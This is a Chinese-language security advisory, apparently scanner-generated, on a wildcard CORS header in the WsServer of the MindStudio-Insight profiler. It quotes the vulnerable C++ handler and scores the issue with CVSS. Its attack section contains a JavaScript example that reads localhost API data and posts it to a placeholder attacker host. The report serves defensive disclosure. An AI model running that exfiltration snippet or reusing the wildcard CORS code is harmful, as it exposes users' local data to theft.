# VULN-SEC-SERVER-001：WsServer返回Access-Control-Allow-Origin通配符致CORS配置过宽

## VULN-SEC-SERVER-001: CORS 配置过于宽松 (CWE-942)

**严重性**: Medium  
**置信度**: 85%  
**CVSS 3.1 评分**: 5.3 (Medium)

---

## 1. 执行摘要

HTTP GET API 端点返回 `Access-Control-Allow-Origin: *` 通配符响应头，允许任何网站进行跨域请求。结合缺失的认证机制，恶意网站可以：
- 从任意第三方网站读取 API 响应数据
- 构造 CSRF-like 攻击窃取用户数据
- 绕过浏览器同源策略保护

---

## 2. 根因分析

### 2.1 漏洞代码位置

**文件**: `server/src/server/WsServer.cpp`  
**行号**: 196-198  
**函数**: `WsServer::AddGetHandler`

```cpp
void WsServer::AddGetHandler(const std::string& key, std::shared_ptr<Core::ApiHandler> handler)
{
    wsApp->get(key.data(), [handler](uWS::HttpResponse<false> *res, uWS::HttpRequest *req) {
        // add coc - CORS 配置
        res->writeHeader("Access-Control-Allow-Origin", "*");  // 漏洞点: 通配符
        res->writeHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
        res->writeHeader("Access-Control-Allow-Headers", "Content-Type");
        
        std::string result;
        handler->run(req->getQuery(), result);
        res->end(result);
    });
}
```

### 2.2 CORS 通配符风险

`Access-Control-Allow-Origin: *` 的含义：
- **允许任何源**的网页发起跨域请求
- 浏览器不会阻止来自 `evil.com` 的请求访问 `localhost:port` 的 API
- 响应数据可被任意 JavaScript 代码读取

### 2.3 为什么这是一个漏洞

MindStudio-Insight 的设计场景：
- 本地工具，绑定 `localhost`
- 无认证机制（信任本地用户）
- API 可返回敏感的 profiler 数据

风险场景：
```
[用户浏览器] 访问 evil.com
    ↓ evil.com 的 JavaScript
[发起请求] fetch("http://localhost:8080/api/sensitive-data")
    ↓ CORS: Access-Control-Allow-Origin: *
[浏览器] 允许跨域，evil.com 可读取响应
    ↓
[数据泄露] 敏感 profiler 数据被恶意网站获取
```

---

## 3. 攻击场景分析

### 3.1 攻击步骤

1. **受害者访问恶意网站**: 用户在分析 profiler 数据时，同时访问了恶意网站 `evil.com`

2. **恶意 JavaScript 执行**:
   ```javascript
   // evil.com 页面中的恶意代码
   fetch("http://localhost:8080/api/project-data")
     .then(response => response.json())
     .then(data => {
       // 将敏感数据发送到攻击者服务器
       fetch("https://attacker.com/collect", {
         method: "POST",
         body: JSON.stringify(data)
       });
     });
   ```

3. **浏览器同源策略绕过**: 由于 CORS 配置为 `*`，浏览器允许 `evil.com` 读取响应

4. **数据泄露**: 敏感的 profiler 分析数据被发送到攻击者服务器

### 3.2 攻击前提条件

| 条件 | 说明 |
|------|------|
| MindStudio-Insight 运行中 | 用户正在使用该工具 |
| 用户访问恶意网站 | 浏览器同时加载恶意页面 |
| 无认证保护 | API 无 token/session 验证 |

---

## 4. 影响评估

### 4.1 潜在影响

| 影响类型 | 严重程度 | 说明 |
|----------|----------|------|
| 数据泄露 | 中 | Profiler 分析数据可能包含敏感信息 |
| 隐私侵犯 | 中 | 用户分析的项目信息被窃取 |
| 供应链攻击风险 | 高 | 如果用户加载了恶意 npm 包 |

### 4.2 实际风险评估

对于本地工具：
- **低风险**: 默认绑定 localhost，外部网络无法直接访问
- **中风险**: 如果配置为绑定网络接口（如 `0.0.0.0`），风险显著增加
- **高风险**: npm 供应链攻击场景，恶意前端代码可直接访问 API

---

## 5. CVSS 3.1 评分

### 5.1 评分向量

```
CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N
```

### 5.2 评分详解

| 指标 | 值 | 说明 |
|------|-----|------|
| Attack Vector (AV) | Network (N) | 通过网络发起跨域请求 |
| Attack Complexity (AC) | High (H) | 需用户同时访问恶意网站 |
| Privileges Required (PR) | None (N) | 无需认证 |
| User Interaction (UI) | Required (R) | 用户需访问恶意网站 |
| Scope (S) | Unchanged (U) | 影响同一资源 |
| Confidentiality (C) | Low (L) | 部分数据泄露 |
| Integrity (I) | None (N) | CORS 本身不修改数据 |
| Availability (A) | None (N) | 不影响可用性 |

**基础评分**: 5.3 (Medium)

---

## 6. 缓解建议

### 6.1 立即修复 (P1)

**方案: 限制 CORS 来源**

```cpp
void WsServer::AddGetHandler(...) {
    wsApp->get(key.data(), [handler](uWS::HttpResponse<false> *res, uWS::HttpRequest *req) {
        // 仅允许 localhost 来源
        res->writeHeader("Access-Control-Allow-Origin", "http://localhost");
        res->writeHeader("Access-Control-Allow-Methods", "GET, OPTIONS");
        res->writeHeader("Access-Control-Allow-Headers", "Content-Type");
        
        // ... 处理请求
    });
}
```

### 6.2 推荐方案: 动态 CORS

```cpp
// 根据请求来源动态设置 CORS
std::string origin = req->getHeader("origin");
std::string allowedOrigin = "http://localhost";
if (origin == allowedOrigin) {
    res->writeHeader("Access-Control-Allow-Origin", origin);
}
```

### 6.3 架构改进 (P2)

1. **添加认证机制**: WebSocket 和 HTTP API 应有 token 验证
2. **CSRF Token**: 对修改操作的请求添加 CSRF 保护
3. **CORS 配置文件**: 将允许的来源列表配置化，便于管理

---

## 7. 相关漏洞

| 漏洞 ID | 类型 | 关系 |
|----------|------|------|
| VULN-SEC-SERVER-002 | CORS 配置 | POST 端点相同问题 |
| server-vuln-005 | CORS 配置 | 不同 Scanner 发现的同一问题 |

---

## 8. 参考资料

- [CWE-942: Permissive Cross-domain Policy](https://cwe.mitre.org/data/definitions/942.html)
- [OWASP CORS Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/COR_Security_Cheat_Sheet.html)
- [MDN: CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)

---

**报告生成时间**: 2026-04-20  
**分析者**: Security Scanner  
**状态**: CONFIRMED